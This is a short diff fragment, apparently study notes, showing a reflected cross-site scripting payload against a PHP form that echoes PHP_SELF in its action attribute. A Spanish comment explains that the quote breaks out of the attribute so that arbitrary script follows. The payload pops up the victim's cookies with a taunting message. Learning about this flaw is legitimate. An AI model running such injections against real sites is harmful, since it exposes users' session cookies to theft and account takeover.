@@ -1,0 +1,3 @@
+ /index.php/"><script>alert("contraseñas son "+document.cookie+" Y están en mí poder");</script>
+
+ Se escapa la comilla y para completar el action= php_self donde imprima index.php cierre > y luego se puede escribir todo el código que se desee.
